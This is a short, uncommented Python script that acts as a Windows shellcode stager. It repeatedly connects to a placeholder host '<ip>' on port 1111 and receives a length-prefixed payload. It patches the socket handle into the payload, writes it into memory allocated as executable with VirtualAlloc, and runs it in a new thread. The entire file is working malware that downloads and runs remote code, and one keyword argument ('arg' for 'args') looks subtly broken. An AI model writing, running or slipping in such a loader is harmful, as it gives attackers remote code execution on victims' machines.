import ctypes
import socket
import struct
import threading
import time

ip = "<ip>"
port = 1111
connected = False
while not connected:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        connected = True
    except TimeoutError:
        time.sleep(0.1)
data = s.recv(4)
data_len = struct.unpack("<I", data)[0] + 5
while len(data) < data_len:
    data += s.recv(data_len - len(data))
handle = struct.pack("<I", s.fileno())
data = bytearray([0xBF]) + bytearray(handle) + data[4:]
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40
kernel32 = ctypes.windll.kernel32
address = kernel32.VirtualAlloc(
    None, len(data), MEM_COMMIT, PAGE_EXECUTE_READWRITE
)
data_array = (ctypes.c_char * len(data)).from_buffer(data)
ctypes.memmove(address, ctypes.pointer(data_array), len(data))

thread = threading.Thread(
    target=ctypes.cast(address, ctypes.CFUNCTYPE(None)), arg=()
)
thread.start()
time.sleep(99999999)
